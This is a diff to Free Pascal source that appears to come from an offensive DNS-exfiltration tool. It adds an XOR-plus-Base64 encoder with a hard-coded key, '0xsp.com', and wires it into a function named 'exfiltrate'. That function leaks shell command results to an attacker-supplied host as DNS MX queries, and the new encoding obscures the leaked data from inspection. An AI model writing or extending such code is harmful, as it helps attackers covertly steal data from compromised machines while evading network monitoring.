@@ -129,27 +129,59 @@ begin
   status := true;
 end;
 
+// thanks to : https://forum.lazarus.freepascal.org/index.php?topic=33743.0
+procedure XorCrypt(Var Buffer; Const Len: Cardinal; Const Key: String);
+Var PB: ^Byte;
+    I, II: Cardinal;
+Begin
+  PB:= @Buffer;
+  II:= 1;
+  For I:= 0 To Len - 1 Do Begin
+    PB^:= PB^ Xor Byte(Key[II]);
+    Inc(PB);
+    Inc(II);
+    If II > Length(Key) Then II:= 1;
+  End;
+End;
+
+Function XorEncodeBase64(Const What, Key: String): String;
+Var P: Pointer;
+    L: Cardinal;
+    M: TMemoryStream;
+Begin
+  //Uses Base64 for encoding
+  L:= Length(What);
+  GetMem(P, L);
+  Try
+    Move(What[1], P^, L);
+    XorCrypt(P^, L, Key);    // xoring
+    M:= TMemoryStream.Create;
+    Try
+      With TBase64EncodingStream.Create(M) Do Try
+        Write(P^, L);
+      Finally
+        Free;
+      End;
+      SetString(Result, PAnsiChar(M.Memory), M.Size);
+    Finally
+      M.Free;
+    End;
+  Finally
+    FreeMem(P);
+  End;
+End;
 
 
 
-// blowfish encryption support
-{
-function encrypt(data:string):string;
-var
-  en: TBlowFishEncryptStream;
-  //de: TBlowFishDeCryptStream;
-  s1,s2: TStringStream;
-  key: String;
-begin
-    key := '0xspdnskey';
-    s1 := TStringStream.Create('');
-    en := TBlowFishEncryptStream.Create(key,s1);
-    en.WriteAnsiString(data);
-    en.Free;
-    result:=s1.datastring;
-end;
-  }
+function TestXorBase64(s:string):string;
+Var  Key, B64: String;
+Begin
 
+  Key:= '0xsp.com'; //default password for xor encryption
+  B64:= XorEncodeBase64(S, Key);
+ result := B64;
+
+End;
 
 function exfiltrate(str:string):string;
 var
@@ -181,7 +213,7 @@ begin
    for i := 0 to High(Arr) do begin
 
   DNSd.TargetHost := i_host;
-  DNSd.DNSQuery(encodestringbase64(Arr[i])+'.'+i_host, QType_MX, l);
+  DNSd.DNSQuery(TestXorBase64(Arr[i])+'.'+i_host, QType_MX, l);
   writeln('[+]Shell command results has been sent -> ');
 end;
 
